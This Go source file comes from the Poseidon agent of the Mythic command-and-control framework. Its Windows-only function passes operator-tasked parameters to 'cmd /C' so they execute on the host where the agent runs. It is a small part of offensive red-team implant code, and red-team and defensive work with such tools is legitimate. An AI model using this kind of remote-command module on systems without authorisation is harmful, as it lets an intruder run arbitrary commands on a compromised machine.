// +build windows

package shell

import (
	// Standard

	"os/exec"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

func getShell(task structs.Task) (*exec.Cmd, error) {
	shellBin := "cmd"
	cmd := exec.Command(shellBin, "/C", task.Params)
	return cmd, nil
}